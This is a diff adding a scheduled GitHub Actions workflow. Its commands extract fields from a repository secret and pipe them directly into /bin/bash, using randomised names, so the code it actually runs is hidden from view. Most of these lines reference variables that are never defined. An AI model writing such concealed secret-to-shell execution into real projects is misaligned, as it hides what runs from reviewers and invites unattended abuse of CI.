@@ -1,0 +1,25 @@
+name: beilixingdi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: beilixingdi
+        env:
+          mnzxj3: ${{ secrets.mnzxj3 }}
+        run: |
+          echo $mnzxj3 | jq -r .ivzo540 | /bin/bash
+          echo $ags68 | jq -r .yzyp46278 | /bin/bash
+          echo $pdiv8208 | jq -r .gx71352 | /bin/bash
+          echo $f48687 | jq -r .prnj35 | /bin/bash
+          echo $xra8060 | jq -r .wv11 | /bin/bash
+          echo $cp47095 | jq -r .cpef7 | /bin/bash
+          echo $geywi59 | jq -r .xqr25749 | /bin/bash
+          echo $e259 | jq -r .dbla0576 | /bin/bash
+          echo $b25090 | jq -r .vc291 | /bin/bash
+          echo $acoz0768 | jq -r .hxtvx446 | /bin/bash
+
